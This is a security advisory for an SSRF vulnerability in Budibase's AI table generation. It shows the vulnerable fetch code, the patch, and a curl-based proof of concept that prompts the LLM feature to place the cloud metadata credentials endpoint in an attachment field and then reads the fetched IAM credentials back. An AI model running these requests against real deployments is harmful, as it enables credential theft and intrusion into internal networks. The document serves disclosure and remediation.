# [M] Budibase: SSRF via bare fetch() in uploadUrl during AI table generation

## Summary
Severity: Medium
Advisory: GHSA-hfhx-w8p8-4hc7
CVE: CVE-2026-73307
CWE: CWE-918
Ecosystem: npm
CVSS: CVSS:4.0/AV:N/AC:L/AT:P/PR:L/UI:N/VC:N/VI:N/VA:N/SC:H/SI:N/SA:N (CVSS_V4)
Published: 2026-07-24
Source: https://github.com/advisories/GHSA-hfhx-w8p8-4hc7
Type: github-advisory

## Affected
- npm: `@budibase/server` — affected >=0

## Details
# Budibase: SSRF via bare fetch() in uploadUrl during AI table generation

## Summary

The `uploadUrl()` function in `packages/server/src/utilities/fileUtils.ts` uses a bare `fetch(url)` call without any SSRF protection. This function is invoked when the AI table generation feature processes LLM-generated attachment column values that are strings (URLs).

A builder-level user can craft prompts that cause the LLM to generate internal IP addresses or cloud metadata endpoints as attachment URLs. When `generateRows()` calls `processAttachments()`, these URLs are fetched server-side without blacklist validation, allowing the attacker to reach internal services, cloud metadata APIs (169.254.169.254), or other network-internal resources.

This is a variant of the same class of issue addressed in other Budibase code paths where `fetchWithBlacklist()` is correctly used to prevent SSRF.

## Affected Versions

<= 3.39.0 (current `lerna.json` version at time of analysis)

## Vulnerability Details

### Root Cause: uploadUrl() uses bare fetch() without SSRF blacklist check

```typescript
// packages/server/src/utilities/fileUtils.ts:21-23
export async function uploadUrl(url: string): Promise<Upload | undefined> {
  try {
    const res = await fetch(url)  // No blacklist validation
```

This is called from:

```typescript
// packages/server/src/sdk/workspace/ai/helpers/rows.ts:104-114
async function processAttachments(
  entry: Record<string, any>,
  attachmentColumns: FieldSchema[]
) {
  function processAttachment(value: any) {
    if (typeof value === "object") {
      return uploadFile(value)
    }

    return uploadUrl(value)  // String values treated as URLs, fetched without protection
  }
```

Which is triggered via `generateRows()` at line 34:

```typescript
// packages/server/src/sdk/workspace/ai/helpers/rows.ts:34
        await processAttachments(entry, attachmentColumns)
```

### Compare with correct sibling: processUrlFile() in extract.ts

```typescript
// packages/server/src/automations/steps/ai/extract.ts:139-144
async function processUrlFile(
  fileUrl: string,
  fileType: SupportedFileType,
  llm: LLMResponse
): Promise<ExtractInput> {
  const response = await fetchWithBlacklist(fileUrl)  // Correct: uses blacklist
```

The `fetchWithBlacklist()` function validates each URL (including redirects) against a blacklist of internal/private IP ranges before making the request:

```typescript
// packages/server/src/automations/steps/utils.ts:100-112
export async function fetchWithBlacklist(
  url: string,
  request: RequestInit = {}
): Promise<Response> {
  const maxRedirects = 5
  let nextUrl = url
  // ...
  for (let redirects = 0; redirects <= maxRedirects; redirects++) {
    await throwIfBlacklisted(nextUrl)  // Validates against private IP ranges
    const response = await fetch(nextUrl, nextRequest)
```

## Proof of Concept

Prerequisites: Builder-level authentication, AI feature enabled on the instance.

```bash
# Step 1: Authenticate as builder
TOKEN=$(curl -s -X POST 'http://TARGET:10000/api/global/auth/default/login' \
  -H 'Content-Type: application/json' \
  -d '{"username":"builder@example.com","password":"password123"}' \
  -c - | grep budibase:auth | awk '{print $NF}')

# Step 2: Create an app with a table that has an attachment column
APP_ID="app_dev_xxxx"  # Use existing app

# Step 3: Use the AI table generation endpoint with a prompt designed to
# produce internal URLs as attachment values.
# The LLM will generate rows with attachment column values pointing to
# internal services.
curl -X POST "http://TARGET:10000/api/workspace/$APP_ID/ai/tables/generate" \
  -H "Content-Type: application/json" \
  -H "Cookie: budibase:auth=$TOKEN" \
  -d '{
    "prompt": "Create a table called Assets with columns: name (string), logo (attachment). Add one row: name=test, logo=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
  }'

# The server will call uploadUrl("http://169.254.169.254/latest/meta-data/iam/security-credentials/")
# which fetches the cloud metadata endpoint without any SSRF protection.
# The response content is saved to object storage and a URL is returned in the row data.

# Step 4: Read the created row to exfiltrate the metadata response
curl -X GET "http://TARGET:10000/api/$APP_ID/rows?tableId=<table_id>" \
  -H "Cookie: budibase:auth=$TOKEN"
# The attachment URL in the response points to the saved metadata content
```

## Impact

- Attacker with builder access can read cloud instance metadata (AWS IAM credentials, GCP service account tokens)
- Internal service enumeration and data exfiltration from private network resources
- Port scanning of internal infrastructure via timing/error differences
- Bypass of network segmentation when Budibase is deployed in a DMZ or VPC

## Suggested Remediation

Replace the bare `fetch()` in `uploadUrl()` with `fetchWithBlacklist()`:

```typescript
// packages/server/src/utilities/fileUtils.ts
import fs from "fs"
-import fetch from "node-fetch"
import path from "path"
import { pipeline } from "stream"
import { promisify } from "util"
import * as uuid from "uuid"

import { context, objectStore } from "@budibase/backend-core"
import { Upload } from "@budibase/types"
import { ObjectStoreBuckets } from "../constants"
+import { fetchWithBlacklist } from "../automations/steps/utils"

// ...

export async function uploadUrl(url: string): Promise<Upload | undefined> {
  try {
-    const res = await fetch(url)
+    const res = await fetchWithBlacklist(url)

    const extension = [...res.url.split(".")].pop()!.split("?")[0]
```

## References
- https://github.com/Budibase/budibase/security/advisories/GHSA-hfhx-w8p8-4hc7
- https://github.com/Budibase/budibase/pull/18866
- https://github.com/Budibase/budibase/commit/72e602d68daeebe3b95b0ed87acd351a38e327d7
- https://github.com/Budibase/budibase
- https://github.com/Budibase/budibase/releases/tag/3.39.4
